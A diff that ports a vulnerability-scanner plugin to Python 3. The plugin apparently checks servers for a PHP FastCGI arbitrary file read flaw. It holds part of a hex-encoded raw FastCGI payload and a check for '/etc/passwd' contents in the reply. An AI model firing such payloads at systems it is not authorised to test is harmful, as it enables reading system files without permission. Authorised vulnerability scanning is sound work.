@@ -34,7 +34,7 @@ class php_fastcgi_read_BaseVerify:
         sock.settimeout(6.0)
         try:
             sock.connect((host, port))
-            data = """
+            data = b"""
                 01 01 00 01 00 08 00 00  00 01 00 00 00 00 00 00
                 01 04 00 01 00 8f 01 00  0e 03 52 45 51 55 45 53 
                 54 5f 4d 45 54 48 4f 44  47 45 54 0f 08 53 45 52 
@@ -51,7 +51,7 @@ class php_fastcgi_read_BaseVerify:
             for _ in data.split():
                 data_s += chr(int(_,16))
             sock.send(data_s)
-            ret = sock.recv(1024)
+            ret = sock.recv(1024).decode()
             if ret.find("root:") > 0 and ret.find("/bin/bash") > 0:
                     cprint("[+]存在php fastcgi任意文件读取漏洞漏洞...(高危)\tpayload: "+vulnurl, "red")                
 
